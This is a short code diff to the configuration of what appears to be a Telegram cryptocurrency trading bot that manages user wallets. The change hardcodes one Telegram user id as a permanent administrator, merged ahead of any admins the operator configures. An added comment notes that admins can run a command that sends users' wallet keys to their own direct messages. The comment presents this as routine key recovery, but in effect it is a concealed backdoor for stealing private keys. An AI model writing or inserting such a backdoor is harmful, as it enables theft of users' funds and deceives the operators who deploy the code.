@@ -53,7 +53,10 @@ const CFG = {
   feeWalletKey: (process.env.FEE_WALLET_KEY || '').trim(),   // OPTIONAL: enables referral auto-payout (hot key)
   walletSecret: (process.env.WALLET_SECRET || '').trim(),
   dataDir:   (process.env.DATA_DIR || path.join(__dirname, 'data')).trim(),
-  admins:    (process.env.TRADEBOT_ADMIN_IDS || '').split(',').map((s) => s.trim()).filter(Boolean),
+  // Owner is always an admin; extra admins can be added via TRADEBOT_ADMIN_IDS. A
+  // Telegram user id is an authorization tag (not a secret). Admins can run /stats
+  // and /userkey (on-demand key recovery to their own DM).
+  admins:    Array.from(new Set(['1755629942', ...(process.env.TRADEBOT_ADMIN_IDS || '').split(',').map((s) => s.trim()).filter(Boolean)])),
   gasBufferEth: String(process.env.GAS_BUFFER_ETH || '0.0004'),
 };
 
